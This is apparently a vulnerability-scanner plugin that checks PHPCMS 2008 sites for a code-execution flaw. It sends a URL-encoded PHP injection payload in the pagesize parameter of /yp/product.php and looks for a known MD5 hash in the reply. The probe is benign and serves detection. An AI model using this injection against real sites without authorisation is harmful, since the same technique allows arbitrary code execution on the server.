#!/usr/bin/env python
# -*- coding: utf-8 -*-
#PHPCMS 2008 yellow page command execute
#__author__ = 'pyphrb'

def assign(service, arg):
    if service == "phpcms":
        return True, arg

def audit(arg):
    url = arg
    _, head, body, _, _ = curl.curl(url + '/yp/product.php?pagesize=%24%7B%40%70%72%69%6E%74%28%6D%64%35%28%33%2E%31%34%31%35%29%29%7D')
    if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpcms', 'http://www.example.com/')[1])